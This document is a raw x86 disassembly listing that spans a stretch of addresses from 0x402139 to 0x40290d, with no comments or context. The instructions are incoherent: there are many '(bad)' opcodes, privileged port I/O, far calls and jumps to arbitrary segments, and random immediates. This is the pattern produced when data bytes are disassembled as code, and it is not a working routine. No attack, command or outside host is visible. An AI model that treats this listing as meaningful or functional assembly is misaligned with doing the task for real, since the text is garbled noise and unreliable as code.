  402139:	sub    eax,0x186ca6e1
  40213e:	xchg   ebp,eax
  40213f:	push   ds
  402140:	mov    BYTE PTR [esi],al
  402142:	push   esi
  402143:	sub    BYTE PTR [ecx+0x47],bh
  402146:	out    dx,eax
  402147:	xor    BYTE PTR [esi],al
  402149:	dec    ebp
  40214a:	daa    
  40214b:	adc    eax,0xcc6330bc
  402150:	lods   al,BYTE PTR ds:[esi]
  402151:	ins    BYTE PTR es:[edi],dx
  402152:	loope  0x4021d1
  402154:	dec    esp
  402155:	lock jg 0x4021b9
  402158:	xchg   esi,eax
  402159:	cmp    BYTE PTR [eax],ch
  40215b:	fsubp  st(3),st
  40215d:	sbb    eax,0x52de621e
  402162:	neg    DWORD PTR [edx-0x53]
  402165:	pop    ds
  402166:	stc    
  402167:	mov    al,ds:0x69d4c81f
  40216c:	popa   
  40216d:	dec    ebp
  40216e:	mov    cl,0xb6
  402170:	and    ecx,DWORD PTR [esi]
  402172:	xchg   ebx,eax
  402173:	xchg   esi,eax
  402174:	adc    eax,0xa74bfc5a
  402179:	ret    0x2c4
  40217c:	add    eax,0xbb678bac
  402181:	mov    ds:0x632a49a5,al
  402186:	pop    ebp
  402187:	ss mov dh,0xee
  40218a:	out    0x7d,al
  40218c:	rol    cl,cl
  40218e:	or     eax,0x5e8e917f
  402193:	dec    edi
  402194:	mul    BYTE PTR [eax-0x1a50c982]
  40219a:	adc    ah,BYTE PTR [ecx]
  40219c:	test   eax,0x61b417fb
  4021a1:	das    
  4021a2:	dec    edx
  4021a3:	lea    ebp,[ecx+0x50]
  4021a6:	test   eax,0x52edc9f4
  4021ab:	pop    eax
  4021ac:	test   BYTE PTR [edx+edx*4],ch
  4021af:	mov    ebp,0xa7b56687
  4021b4:	xor    BYTE PTR [eax-0x11374ef0],dh
  4021ba:	xchg   ecx,eax
  4021bb:	(bad)  
  4021bc:	outs   dx,BYTE PTR ds:[esi]
  4021bd:	shl    ebp,1
  4021bf:	ss ins BYTE PTR es:[edi],dx
  4021c1:	xchg   edi,eax
  4021c2:	int3   
  4021c3:	clc    
  4021c4:	push   edx
  4021c5:	mov    bh,0x43
  4021c7:	inc    eax
  4021c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4021c9:	sbb    al,0x2
  4021cb:	mov    ecx,0x16f16be1
  4021d0:	sub    eax,0x673fd527
  4021d5:	push   ebp
  4021d6:	outs   dx,BYTE PTR ds:[esi]
  4021d7:	in     al,0x1a
  4021d9:	call   0xeace:0xad46c280
  4021e0:	mov    bh,0xf1
  4021e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4021e3:	xor    DWORD PTR [ebx+ecx*4],0x26bd0bbf
  4021ea:	mov    edx,0x3b5e359b
  4021ef:	les    esp,FWORD PTR [ebx+0x46315161]
  4021f5:	xor    DWORD PTR [esi+0x3b],eax
  4021f8:	fidiv  DWORD PTR [ecx+0x642b080c]
  4021fe:	mov    ebx,0x346454c9
  402203:	ja     0x40227a
  402205:	inc    esi
  402206:	repz js 0x40226c
  402209:	pop    eax
  40220a:	push   ebx
  40220b:	cs cmp esp,esi
  40220e:	cmc    
  40220f:	out    dx,al
  402210:	push   0xaf2217dd
  402215:	rcl    DWORD PTR [esi-0x4b774a47],0x78
  40221c:	sub    ebx,DWORD PTR [ecx]
  40221e:	inc    edi
  40221f:	xlat   BYTE PTR ds:[ebx]
  402220:	cmp    DWORD PTR [edi-0x1636175],ebp
  402226:	stc    
  402227:	call   0x5cdc81c5
  40222c:	fisttp QWORD PTR [ebx+0xd]
  40222f:	jnp    0x4021c4
  402231:	imul   eax,ecx,0x1c
  402234:	daa    
  402235:	in     eax,dx
  402236:	pop    ebx
  402237:	ficom  WORD PTR [edx-0x1e]
  40223a:	sub    ch,BYTE PTR [ecx]
  40223c:	clc    
  40223d:	fstp   TBYTE PTR [ecx-0x69]
  402240:	fbld   TBYTE PTR [ebp-0x1c]
  402243:	sub    eax,0x1c46b069
  402248:	cmp    DWORD PTR [eax+0x50c818f7],esp
  40224e:	(bad)  
  40224f:	(bad)  
  402250:	xadd   BYTE PTR [ebp-0x5d],ch
  402254:	push   cs
  402255:	mov    DWORD PTR [eax-0x48124ee4],0xc9c9fbdd
  40225f:	js     0x40220b
  402261:	sub    bl,BYTE PTR [esi+ecx*2+0x472ff586]
  402268:	ins    BYTE PTR es:[edi],dx
  402269:	sub    ch,BYTE PTR [ecx-0x2cf04694]
  40226f:	ins    DWORD PTR es:[edi],dx
  402270:	mov    bl,0xb6
  402272:	idiv   BYTE PTR [ecx]
  402274:	or     eax,0x7a5623ba
  402279:	jbe    0x402271
  40227b:	adc    eax,0x67311209
  402280:	jge    0x4022ed
  402282:	mov    dl,0x3b
  402284:	fidivr WORD PTR [ebp-0x46]
  402287:	retf   0x81ff
  40228a:	or     BYTE PTR [edx-0x71],ah
  40228d:	push   esi
  40228e:	inc    edx
  40228f:	add    DWORD PTR [eax-0x40],ebp
  402292:	fisttp WORD PTR [esi]
  402294:	mov    ecx,0x568c8a97
  402299:	and    BYTE PTR [ebx],0x40
  40229c:	push   0xb0fcc4c2
  4022a1:	outs   dx,BYTE PTR ds:[esi]
  4022a2:	add    BYTE PTR [edx-0x6c694675],ah
  4022a8:	adc    al,0xa
  4022aa:	mov    al,ds:0x5bb0d549
  4022af:	xor    DWORD PTR ds:0x77944bba,0xffffffc9
  4022b6:	pusha  
  4022b7:	push   edi
  4022b8:	push   ds
  4022b9:	jne    0x402303
  4022bb:	jecxz  0x402308
  4022bd:	cmp    DWORD PTR [edi],0x7d
  4022c0:	sbb    BYTE PTR [esi-0x55],cl
  4022c3:	pcmpgtw mm1,QWORD PTR [ecx-0x6f1f7e18]
  4022ca:	xchg   esp,eax
  4022cb:	aad    0xc9
  4022cd:	in     eax,dx
  4022ce:	xor    DWORD PTR [edx-0x377b78a],edx
  4022d4:	sbb    eax,0xcf5fa1a2
  4022d9:	lods   eax,DWORD PTR ds:[esi]
  4022da:	xchg   ebp,eax
  4022db:	xchg   esp,eax
  4022dc:	out    dx,eax
  4022dd:	and    eax,0xcbde096a
  4022e2:	pop    DWORD PTR [edx+0x29ab63b]
  4022e8:	(bad)  
  4022e9:	cdq    
  4022ea:	jo     0x402282
  4022ec:	pop    esp
  4022ed:	sbb    BYTE PTR [edi-0x77],dl
  4022f0:	xchg   ebp,eax
  4022f1:	pop    ds
  4022f2:	cmp    BYTE PTR [edi-0x50],al
  4022f5:	pop    ecx
  4022f6:	pushf  
  4022f7:	or     cl,ch
  4022f9:	jecxz  0x40231a
  4022fb:	sub    ebx,DWORD PTR [esi]
  4022fd:	lea    esp,[ecx+0x13]
  402300:	outs   dx,BYTE PTR ds:[esi]
  402301:	fxch   st(5)
  402303:	icebp  
  402304:	push   ss
  402305:	jo     0x402337
  402307:	pop    eax
  402308:	aas    
  402309:	push   es
  40230a:	xchg   BYTE PTR [esi+0x77],dh
  40230d:	repnz push ds
  40230f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402310:	dec    ebp
  402311:	ror    DWORD PTR [edi+0x5e217439],0xd8
  402318:	mov    dh,0xc6
  40231a:	in     eax,dx
  40231b:	inc    ecx
  40231c:	sar    ecx,0xb1
  40231f:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402321:	push   edi
  402322:	repz sub DWORD PTR [ecx-0x3213e57],ebx
  402329:	pop    ebx
  40232a:	jecxz  0x40233a
  40232c:	pop    edx
  40232d:	enter  0x5475,0xf3
  402331:	add    DWORD PTR ds:[edi+edi*1-0x5f3be3a5],ecx
  402339:	adc    DWORD PTR [edi],0x58
  40233c:	shl    BYTE PTR [esi],1
  40233e:	not    BYTE PTR [eax]
  402340:	push   0x25ab8833
  402345:	push   edi
  402346:	mov    edx,0x18867749
  40234b:	adc    DWORD PTR [edx-0x25232599],ecx
  402351:	int3   
  402352:	(bad)  
  402353:	popf   
  402354:	xchg   ebp,eax
  402355:	addr16 inc esp
  402357:	mov    ebx,0x9918dc3
  40235c:	(bad)  
  40235d:	xchg   ecx,eax
  40235e:	(bad)  
  40235f:	daa    
  402360:	xchg   edi,eax
  402361:	xchg   esp,eax
  402362:	mov    ds:0x8f0363af,al
  402367:	test   DWORD PTR [esi-0x49],eax
  40236a:	jmp    0x70a1:0xe4b62e15
  402371:	sti    
  402372:	and    BYTE PTR [edi+0x45],bl
  402375:	dec    esi
  402376:	rcr    BYTE PTR [ecx-0x14],1
  402379:	cwde   
  40237a:	sub    al,0x3f
  40237c:	mov    dl,0x48
  40237e:	pop    esp
  40237f:	jmp    0x5cf0:0x12873bc5
  402386:	fcomp  DWORD PTR [edi+eax*1+0x69]
  40238a:	mov    al,0x70
  40238c:	cld    
  40238d:	dec    edi
  40238e:	push   0xffffffe7
  402390:	cmp    DWORD PTR gs:[ebp+0x62599031],ebx
  402397:	cmp    DWORD PTR [eax+0x551b007b],0xffffffad
  40239e:	mov    edi,0xb9fec9e3
  4023a3:	pop    eax
  4023a4:	jg     0x402396
  4023a6:	jp     0x402385
  4023a8:	fnsave [esi+eax*1+0x39]
  4023ac:	mov    esi,0x6dbb91b9
  4023b1:	fcomip st,st(4)
  4023b3:	jl     0x402343
  4023b5:	mov    al,ds:0xba471578
  4023ba:	or     eax,0xff29508d
  4023bf:	jo     0x402359
  4023c1:	adc    BYTE PTR [edx-0x77ab3dda],bl
  4023c7:	push   DWORD PTR [edx-0x7ad93717]
  4023cd:	mov    ebx,0xf5b0401f
  4023d2:	xor    DWORD PTR [ebp-0x6a43f085],0x6d
  4023d9:	jmp    0xbe77:0x1c8d1151
  4023e0:	cs jo  0x4023a5
  4023e3:	mov    ecx,0x2edc8494
  4023e8:	jmp    0x402399
  4023ea:	xchg   esp,eax
  4023eb:	inc    ecx
  4023ec:	push   cs
  4023ed:	fmul   DWORD PTR [ebp-0x4d]
  4023f0:	(bad)  
  4023f1:	xchg   esi,eax
  4023f2:	loopne 0x4023a9
  4023f4:	inc    esi
  4023f5:	aam    0xc5
  4023f7:	aad    0x41
  4023f9:	cmp    dl,dh
  4023fb:	add    al,0xcf
  4023fd:	push   eax
  4023fe:	sub    dl,BYTE PTR [ebp+0x77a03cda]
  402404:	lods   al,BYTE PTR ds:[si]
  402406:	pop    eax
  402407:	into   
  402408:	out    0x3b,al
  40240a:	inc    ebp
  40240b:	idiv   BYTE PTR [eax+0x7d5af91b]
  402411:	les    edx,FWORD PTR [edi]
  402413:	push   esi
  402414:	fidiv  DWORD PTR [ebx-0x5e]
  402417:	push   eax
  402418:	outs   dx,BYTE PTR ds:[esi]
  402419:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  40241b:	inc    ebx
  40241c:	inc    edi
  40241d:	xchg   ecx,eax
  40241e:	fcom   DWORD PTR [ebx+0x180fe69b]
  402424:	icebp  
  402425:	not    DWORD PTR [ebp+0x6a8c8d88]
  40242b:	popf   
  40242c:	xchg   BYTE PTR [eax],bh
  40242e:	arpl   WORD PTR [edi-0x436176cf],sp
  402434:	xor    edx,DWORD PTR [ebp+0x78]
  402437:	add    ah,BYTE PTR [esi+0x5b]
  40243a:	(bad)  
  40243b:	repz push eax
  40243d:	ret    0xd95f
  402440:	xchg   edx,eax
  402441:	mov    es,WORD PTR [ebx-0x58]
  402444:	xor    DWORD PTR [edx],eax
  402446:	lds    ecx,FWORD PTR [ebx]
  402448:	dec    eax
  402449:	sbb    DWORD PTR [ebp+0x6ba14952],ebx
  40244f:	pusha  
  402450:	push   edi
  402451:	leave  
  402452:	pop    edx
  402453:	rcl    WORD PTR [ebx+eax*1-0x3c835ba5],0xe6
  40245c:	mov    ecx,0xd7aed730
  402461:	(bad)  
  402462:	popa   
  402463:	xlat   BYTE PTR ds:[ebx]
  402464:	jmp    0x402429
  402466:	aad    0xe0
  402468:	retf   
  402469:	ins    DWORD PTR es:[edi],dx
  40246a:	mov    edx,0xa65e0bcd
  40246f:	push   ecx
  402470:	stos   BYTE PTR es:[edi],al
  402471:	pop    ecx
  402472:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402473:	push   ebx
  402474:	jae    0x402401
  402476:	pushf  
  402477:	and    cl,BYTE PTR es:[ebx-0x1d]
  40247b:	(bad)  
  40247c:	in     al,0x9f
  40247e:	cdq    
  40247f:	fs cmp esp,edx
  402482:	pop    eax
  402483:	pop    edx
  402484:	xor    al,0xc0
  402486:	shr    BYTE PTR [ebx+0x4f],1
  402489:	mov    dh,0x5e
  40248b:	sahf   
  40248c:	mov    bh,0x64
  40248e:	cdq    
  40248f:	jge    0x4024a4
  402491:	loop   0x4024d5
  402493:	dec    eax
  402494:	(bad)  
  402496:	neg    BYTE PTR [ebp+0x33]
  402499:	push   ds
  40249a:	out    dx,al
  40249b:	jg     0x402458
  40249d:	mov    edi,0x97218199
  4024a2:	stos   BYTE PTR es:[edi],al
  4024a3:	pushf  
  4024a4:	dec    edi
  4024a5:	sub    al,0x61
  4024a7:	retf   0x64d5
  4024aa:	inc    eax
  4024ab:	jns    0x40248a
  4024ad:	call   0x1740:0xe3417944
  4024b4:	lds    edx,FWORD PTR ds:0x503834cf
  4024ba:	jecxz  0x402456
  4024bc:	xor    eax,ecx
  4024be:	push   es
  4024bf:	popa   
  4024c0:	lods   al,BYTE PTR ds:[esi]
  4024c1:	mov    ebx,0x94747da8
  4024c6:	repz push eax
  4024c8:	or     BYTE PTR [ebp-0x4e75dd0c],dh
  4024ce:	sahf   
  4024cf:	adc    eax,0xc2dd15f1
  4024d4:	outs   dx,BYTE PTR ds:[esi]
  4024d5:	shl    DWORD PTR [esi+0x32],0x96
  4024d9:	jle    0x402484
  4024db:	pop    es
  4024dc:	lock sub edi,DWORD PTR [edi+0x6678a43b]
  4024e3:	shl    esp,1
  4024e5:	and    DWORD PTR [esp+ecx*8],ecx
  4024e8:	stc    
  4024e9:	popa   
  4024ea:	pop    ecx
  4024eb:	sub    DWORD PTR [esi-0x23],edx
  4024ee:	xor    eax,0x68516c1f
  4024f3:	or     bl,dl
  4024f5:	sbb    cl,ah
  4024f7:	fsubr  DWORD PTR [edx]
  4024f9:	stos   BYTE PTR es:[edi],al
  4024fa:	lsl    ebx,WORD PTR [edi]
  4024fd:	mov    BYTE PTR [ecx-0x5f],ch
  402500:	out    0x2d,al
  402502:	sbb    eax,0x4af8d8bf
  402507:	push   ds
  402508:	mov    esi,0x1085faf6
  40250d:	jnp    0x4024f8
  40250f:	data16 fstp TBYTE PTR [ebp+0x254b002]
  402516:	xor    ch,BYTE PTR [edx-0xadf5a78]
  40251c:	xor    al,0xb3
  40251e:	jmp    0x9e41:0x1212f0c2
  402525:	arpl   WORD PTR [ebx+0x3f965f3e],ax
  40252b:	nop
  40252c:	xlat   BYTE PTR ds:[ebx]
  40252d:	sub    BYTE PTR [eax-0x31ff32dc],ch
  402533:	retf   0x9625
  402536:	(bad)  
  402537:	xchg   esi,eax
  402538:	jge    0x4025b3
  40253a:	lods   al,BYTE PTR ds:[esi]
  40253b:	jl     0x40250d
  40253d:	popf   
  40253e:	popa   
  40253f:	std    
  402540:	hlt    
  402541:	stc    
  402542:	lds    ebp,FWORD PTR [eax-0x3a2bcf47]
  402548:	pop    es
  402549:	dec    eax
  40254a:	inc    ecx
  40254c:	fsub   DWORD PTR [edi+0xcc3182c]
  402552:	test   BYTE PTR [ebx-0x80],0xfe
  402556:	lea    ebx,[ebx]
  402558:	jg     0x40251b
  40255a:	repz fwait
  40255c:	xor    al,0x51
  40255e:	test   eax,0x78d49abc
  402563:	add    BYTE PTR [eax-0x418d7c98],dl
  402569:	xlat   BYTE PTR ds:[ebx]
  40256a:	add    ecx,DWORD PTR [edi]
  40256c:	pushf  
  40256d:	pop    ds
  40256e:	loope  0x402538
  402570:	dec    esp
  402571:	ret    
  402572:	jl     0x4025a4
  402574:	cdq    
  402575:	jb     0x4025a8
  402577:	rcl    BYTE PTR [ebx-0x70],cl
  40257a:	icebp  
  40257b:	sub    BYTE PTR [esi+0x4b],al
  40257e:	fnsave [esi]
  402580:	inc    ebx
  402581:	jmp    0x402575
  402583:	or     bl,BYTE PTR [ecx+0x7b4408fa]
  402589:	mov    al,0x65
  40258b:	push   ss
  40258c:	sub    ebp,DWORD PTR [di+0x4419]
  402591:	in     eax,0x91
  402593:	jge    0x4025d5
  402595:	mov    esp,0x81861a2
  40259a:	mov    eax,ds:0x77dbee63
  40259f:	mov    eax,0xbf6400c6
  4025a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4025a5:	pop    esp
  4025a6:	je     0x4025ad
  4025a8:	add    al,BYTE PTR [esi-0x27ac372c]
  4025ae:	inc    ebp
  4025af:	and    DWORD PTR [esp+edx*2-0xead686d],esi
  4025b6:	mov    dh,cl
  4025b8:	inc    eax
  4025b9:	and    al,0x8f
  4025bb:	stos   BYTE PTR es:[edi],al
  4025bc:	xchg   esp,eax
  4025bd:	dec    edi
  4025be:	jg     0x40262f
  4025c0:	push   0xffffffb3
  4025c2:	inc    edi
  4025c3:	inc    ebp
  4025c4:	pop    eax
  4025c5:	or     ah,BYTE PTR [ebx]
  4025c7:	cdq    
  4025c8:	push   0xffffffd1
  4025ca:	push   esp
  4025cb:	push   esi
  4025cc:	aad    0xde
  4025ce:	xchg   ebx,eax
  4025cf:	sbb    eax,0xe1b9272e
  4025d4:	pop    edi
  4025d5:	stos   BYTE PTR es:[edi],al
  4025d6:	lahf   
  4025d7:	jae    0x402588
  4025d9:	jns    0x40256e
  4025db:	jns    0x402562
  4025dd:	sub    BYTE PTR [eax+eiz*4],ah
  4025e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4025e1:	add    al,0x8c
  4025e3:	into   
  4025e4:	push   ebp
  4025e5:	not    BYTE PTR [eax]
  4025e7:	sbb    dh,BYTE PTR [eax+0x715ae062]
  4025ed:	cwde   
  4025ee:	leave  
  4025ef:	into   
  4025f0:	jmp    0x40260a
  4025f2:	xlat   BYTE PTR ds:[ebx]
  4025f3:	adc    al,0x1d
  4025f5:	sar    BYTE PTR [edx+ebp*2],0xf0
  4025f9:	adc    ecx,DWORD PTR [ebx-0x19]
  4025fc:	test   BYTE PTR [ebx-0x3876e816],ch
  402602:	ins    DWORD PTR es:[edi],dx
  402603:	sub    DWORD PTR [esp+ebp*8],ebp
  402606:	fdivr  st(3),st
  402608:	add    ebx,esp
  40260a:	mov    bl,ch
  40260c:	into   
  40260d:	sbb    ch,BYTE PTR cs:[esp+eax*4+0x71]
  402612:	sub    al,0x79
  402615:	call   0xadc3:0xbb05b214
  40261c:	mov    edi,0x779fc161
  402621:	pop    es
  402622:	je     0x4025d6
  402624:	mov    DWORD PTR [eax+0x21],edx
  402627:	sbb    eax,0xe168e662
  40262c:	sub    BYTE PTR [ecx],ah
  40262e:	addr16 retf 0xd206
  402632:	out    dx,eax
  402633:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402634:	into   
  402635:	std    
  402636:	mov    esp,0x50d422d0
  40263b:	jo     0x40262a
  40263d:	sub    eax,DWORD PTR [eax+0xb10cf71]
  402643:	inc    edx
  402644:	add    cl,ch
  402646:	xor    ecx,DWORD PTR [edi]
  402648:	mov    DWORD PTR [edx],esp
  40264a:	ins    BYTE PTR es:[edi],dx
  40264b:	jbe    0x402619
  40264d:	add    DWORD PTR [ebp+esi*4+0x60],ecx
  402651:	or     al,0x99
  402653:	and    DWORD PTR [edi+eiz*4+0x20],ebx
  402657:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402658:	loop   0x4026cf
  40265a:	out    0xf,eax
  40265c:	sbb    al,0xb3
  40265e:	shl    DWORD PTR [ebx-0x14],cl
  402661:	in     eax,dx
  402662:	xchg   ebp,eax
  402663:	lds    edi,FWORD PTR [eax+ebp*2-0x2]
  402667:	mov    dl,0x8c
  402669:	or     BYTE PTR [eax],dl
  40266b:	mov    al,0x19
  40266d:	(bad)  
  40266f:	ret    
  402670:	mov    al,0x2e
  402672:	xor    BYTE PTR [ecx-0x15d57439],al
  402678:	not    esp
  40267a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40267b:	inc    edi
  40267c:	mov    edi,0x2ff3faac
  402681:	xchg   ecx,eax
  402682:	ins    BYTE PTR es:[edi],dx
  402683:	cwde   
  402684:	fild   WORD PTR [ecx-0x662339fb]
  40268a:	dec    edx
  40268b:	push   0xc802e461
  402690:	fnstcw WORD PTR [edx+0x2a0dfbff]
  402696:	(bad)  
  402697:	aam    0xa0
  402699:	into   
  40269a:	ret    0xd167
  40269d:	mov    ds:0x999b1ca0,eax
  4026a2:	inc    esp
  4026a3:	push   edx
  4026a4:	jl     0x4026d4
  4026a6:	xor    al,0x83
  4026a8:	sub    ch,BYTE PTR [esi+ebp*2+0x72]
  4026ac:	cs repz jg 0x4026cc
  4026b0:	mov    ah,0xf0
  4026b2:	or     BYTE PTR [eax+edi*2-0x56e5abb4],0x8f
  4026ba:	idiv   DWORD PTR [ebx]
  4026bc:	push   0x85283cd
  4026c1:	rcr    BYTE PTR [edx-0x48],1
  4026c4:	out    0x65,al
  4026c6:	ins    BYTE PTR es:[edi],dx
  4026c7:	sub    ebp,DWORD PTR [edi+0x79baad04]
  4026cd:	in     eax,0x29
  4026cf:	or     ah,BYTE PTR [ebx+0x566ee0a6]
  4026d5:	mov    ecx,0xa11075f7
  4026da:	popa   
  4026db:	pop    ecx
  4026dc:	dec    eax
  4026dd:	fmulp  st(1),st
  4026df:	aam    0xb
  4026e1:	and    DWORD PTR [ebx],esi
  4026e3:	into   
  4026e4:	xchg   edx,eax
  4026e5:	rol    BYTE PTR [esi+0x3706aef8],cl
  4026eb:	add    ebp,ebp
  4026ed:	out    0xfe,eax
  4026ef:	(bad)  
  4026f0:	pcmpgtw mm4,QWORD PTR [esp+ecx*8+0x698113da]
  4026f8:	jmp    0xdbd3:0x99564055
  4026ff:	call   0xb80f:0x29be3c8d
  402706:	sub    dl,bl
  402708:	aas    
  402709:	dec    esp
  40270a:	(bad)  
  40270b:	jle    0x402695
  40270d:	sbb    dl,al
  40270f:	mul    eax
  402711:	mov    bl,0x2f
  402713:	cmp    ebx,DWORD PTR [edx+0x74]
  402716:	mov    esp,0x79a32b24
  40271b:	sbb    esp,edi
  40271d:	dec    edi
  40271e:	rcl    BYTE PTR [edx+edi*1-0x1e],1
  402722:	inc    edx
  402723:	add    dh,cl
  402725:	stos   DWORD PTR es:[edi],eax
  402726:	cmp    esi,DWORD PTR [eax+esi*8-0x30]
  40272a:	inc    edx
  40272b:	mov    ebp,0xf0373def
  402730:	in     al,dx
  402731:	jne    0x40277e
  402733:	mov    ah,BYTE PTR [edi]
  402735:	mov    al,0x1e
  402737:	mov    ds:0x6bbc650b,al
  40273c:	mov    fs,WORD PTR ds:0x3e30c3ac
  402742:	xchg   DWORD PTR [esi],ebp
  402744:	mov    WORD PTR [edx+eiz*2+0x7],ds
  402748:	imul   esi,DWORD PTR [ebp+esi*1+0x384812a7],0x66
  402750:	lock mov ebp,0x77181145
  402756:	xchg   esp,eax
  402757:	sti    
  402758:	jg     0x402759
  40275a:	mov    al,ds:0xae67b2bb
  40275f:	or     al,0x70
  402761:	mov    al,0x21
  402763:	push   es
  402764:	or     BYTE PTR [ecx+edx*4],ah
  402767:	push   0x2b
  402769:	push   0x4f88678c
  40276e:	sub    BYTE PTR [ebx],0x8d
  402771:	fisub  WORD PTR [edx]
  402773:	dec    ebx
  402774:	mov    ah,0x44
  402776:	push   ebp
  402777:	dec    edi
  402778:	int3   
  402779:	dec    edi
  40277a:	rcl    BYTE PTR [eax-0x31679fbb],1
  402780:	lods   al,BYTE PTR ds:[esi]
  402781:	loop   0x402766
  402783:	pop    ebp
  402784:	enter  0x43db,0x3f
  402788:	xor    edx,DWORD PTR [ecx-0x6e]
  40278b:	mov    ds:0x7f5c5605,al
  402790:	mov    cl,0x16
  402792:	push   ds
  402793:	stos   BYTE PTR es:[edi],al
  402794:	mov    ch,0xcc
  402796:	(bad)  
  402797:	shl    DWORD PTR [edi+0x30],cl
  40279a:	push   eax
  40279b:	in     al,dx
  40279c:	add    dh,BYTE PTR es:[edx+0x58]
  4027a0:	pop    edi
  4027a1:	mov    esi,0x1775654a
  4027a6:	pushf  
  4027a7:	fistp  WORD PTR [edi+0x1fe60130]
  4027ad:	mov    al,0xb9
  4027af:	cmp    bl,BYTE PTR [ecx+0x1a417ac1]
  4027b5:	hlt    
  4027b6:	repz jmp 0x3ceb83aa
  4027bc:	psubsb mm7,QWORD PTR [esi]
  4027bf:	clc    
  4027c0:	(bad)  
  4027c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4027c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4027c3:	xor    al,0xad
  4027c5:	bound  esi,QWORD PTR [eax]
  4027c7:	jmp    0x4027a3
  4027c9:	cmp    ah,dl
  4027cb:	cmp    BYTE PTR [esi-0x21],al
  4027ce:	retf   0x7e07
  4027d1:	sub    al,0xba
  4027d3:	xchg   DWORD PTR [ebx],ecx
  4027d5:	sub    bh,BYTE PTR [esp+ecx*4-0x43]
  4027d9:	mov    ecx,0xd4285005
  4027de:	sbb    al,0xae
  4027e0:	push   cs
  4027e1:	(bad)  
  4027e2:	push   ecx
  4027e3:	mov    bl,0x8d
  4027e5:	xchg   edi,eax
  4027e6:	pop    edx
  4027e7:	(bad)  
  4027e8:	jmp    0x6fd:0x138e69fa
  4027ef:	sub    BYTE PTR [edi-0xe4dac6b],ah
  4027f5:	sbb    DWORD PTR [esi-0x41],edi
  4027f8:	sub    BYTE PTR [ebx],bh
  4027fa:	xchg   esp,eax
  4027fb:	test   eax,0x3870296f
  402800:	sub    dl,BYTE PTR [edx-0x65]
  402803:	fbld   TBYTE PTR [ecx-0x2a]
  402806:	mov    dh,0x35
  402808:	add    eax,0x28483f0c
  40280d:	mov    dh,0x5c
  40280f:	mov    esi,0x52814f
  402814:	retf   
  402815:	or     al,BYTE PTR [edx]
  402817:	adc    dh,bl
  402819:	or     DWORD PTR [ecx+0x2f25e5b8],edi
  40281f:	shl    al,cl
  402821:	xor    al,0xd8
  402823:	or     DWORD PTR [ebx+0x5b],ecx
  402826:	dec    esp
  402827:	cmp    BYTE PTR [ecx],bl
  402829:	mov    eax,ds:0x78c1662a
  40282e:	loope  0x4027fa
  402830:	fsubr  QWORD PTR [edi+eiz*2+0x7]
  402834:	cmp    DWORD PTR [ebx+0x4faa2852],esi
  40283a:	in     al,0xad
  40283c:	and    al,0x4a
  40283e:	(bad)  
  402840:	sub    ebx,eax
  402842:	ror    BYTE PTR [edi],1
  402844:	dec    edx
  402845:	stc    
  402846:	inc    esp
  402847:	adc    DWORD PTR [edx],esp
  402849:	popf   
  40284a:	inc    esp
  40284b:	jmp    0x40285b
  40284d:	xchg   DWORD PTR [ecx+0x65cffc0a],ebx
  402853:	js     0x4028d2
  402855:	adc    BYTE PTR [edi],ah
  402857:	rcr    BYTE PTR [esi-0x4b],0x63
  40285b:	popa   
  40285c:	pop    edi
  40285d:	dec    edi
  40285e:	and    al,0x3d
  402860:	out    0xf7,al
  402862:	stc    
  402863:	iret   
  402864:	stos   BYTE PTR es:[edi],al
  402865:	mov    edx,0xc5f0bd27
  40286a:	jp     0x40281b
  40286c:	xchg   ecx,eax
  40286d:	ja     0x40282e
  40286f:	cmp    dl,0xc5
  402872:	dec    esp
  402873:	mov    al,ds:0x57678a68
  402878:	jg     0x402848
  40287a:	lods   eax,DWORD PTR ds:[esi]
  40287b:	jge    0x402835
  40287d:	je     0x40280c
  40287f:	ja     0x402853
  402881:	add    eax,DWORD PTR [edi]
  402883:	pop    esi
  402884:	ftst   
  402886:	adc    BYTE PTR [ecx],ah
  402888:	cmp    ah,bl
  40288a:	push   ecx
  40288b:	stos   DWORD PTR es:[edi],eax
  40288c:	xchg   esi,eax
  40288d:	in     al,0x36
  40288f:	dec    eax
  402890:	inc    esi
  402891:	cli    
  402892:	xchg   ecx,eax
  402893:	scas   al,BYTE PTR es:[edi]
  402894:	fwait
  402895:	std    
  402896:	daa    
  402897:	scas   eax,DWORD PTR es:[edi]
  402898:	and    eax,0x8395a251
  40289d:	scas   al,BYTE PTR es:[edi]
  40289e:	test   DWORD PTR [ebx-0x1f1dcab2],eax
  4028a4:	cmp    ecx,0xffffff83
  4028a7:	shl    ebx,cl
  4028a9:	arpl   bx,ax
  4028ab:	dec    ebp
  4028ac:	call   0x1949:0xaabeb8ea
  4028b3:	clc    
  4028b4:	out    dx,al
  4028b5:	xchg   DWORD PTR [edi],edi
  4028b7:	xchg   esi,esp
  4028b9:	xchg   ebx,eax
  4028ba:	and    bl,BYTE PTR [esp+edx*1-0x4f18085e]
  4028c1:	push   es
  4028c2:	fstp   DWORD PTR [ecx]
  4028c4:	push   ss
  4028c5:	jns    0x4028b6
  4028c7:	push   esp
  4028c8:	mov    ah,0xc1
  4028ca:	repz xchg edi,eax
  4028cc:	test   eax,0xc1d52309
  4028d1:	mov    ds:0xe3a8c58c,eax
  4028d6:	sbb    DWORD PTR [eax-0x50c97f2e],esi
  4028dc:	inc    esp
  4028dd:	repnz mov edx,0xf7e101c5
  4028e3:	(bad)  
  4028e4:	sub    DWORD PTR [esi+0x4f],edx
  4028e7:	push   edx
  4028e8:	and    eax,DWORD PTR ds:0x761df60b
  4028ee:	fs jbe 0x402880
  4028f1:	sbb    al,0x8f
  4028f3:	fnstcw WORD PTR [ebx-0x6a1f589c]
  4028f9:	int    0xfb
  4028fb:	stc    
  4028fc:	aad    0x19
  4028fe:	lds    edx,FWORD PTR [ebx-0x42]
  402901:	mov    ds:0xcade2a63,eax
  402906:	imul   ebp,DWORD PTR [edi-0x86373d2],0x44
  40290d:	jbe    0x402921
